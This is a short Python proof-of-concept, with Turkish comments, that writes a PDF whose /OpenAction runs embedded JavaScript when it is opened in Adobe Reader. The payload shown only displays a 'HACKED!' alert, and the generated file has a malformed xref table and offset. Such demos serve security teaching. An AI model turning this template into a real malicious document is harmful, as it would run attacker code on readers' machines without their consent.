print("--- PDF EXPLOIT GENERATOR (PoC) ---")
# Zararlı JavaScript Kodu (Sadece uyarı verir)
js_code = "/S /JavaScript /JS (app.alert('HACKED! Bu PDF zararlı kod içeriyor!');)"

pdf_content = (
    "%PDF-1.7\n"
    "1 0 obj\n"
    "<< /Type /Catalog /Outlines 2 0 R /Pages 3 0 R /OpenAction 4 0 R >>\n"
    "endobj\n"
    "2 0 obj\n"
    "<< /Type /Outlines /Count 0 >>\n"
    "endobj\n"
    "3 0 obj\n"
    "<< /Type /Pages /Kids [5 0 R] /Count 1 >>\n"
    "endobj\n"
    "4 0 obj\n"
    f"<< /Type /Action {js_code} >>\n"
    "endobj\n"
    "5 0 obj\n"
    "<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] /Contents 6 0 R >>\n"
    "endobj\n"
    "6 0 obj\n"
    "<< /Length 44 >>\n"
    "stream\n"
    "BT /F1 24 Tf 100 700 Td (ZARARLI PDF DEMO) Tj ET\n"
    "endstream\n"
    "endobj\n"
    "xref\n"
    "0 7\n"
    "0000000000 65535 f \n"
    "trailer\n"
    "<< /Size 7 /Root 1 0 R >>\n"
    "startxref\n"
    "400\n"
    "%%EOF"
)

with open("malicious_demo.pdf", "w") as f:
    f.write(pdf_content)

print("✅ 'malicious_demo.pdf' oluşturuldu.")
print("Bu PDF açıldığında Adobe Reader içinde JavaScript çalıştırır.")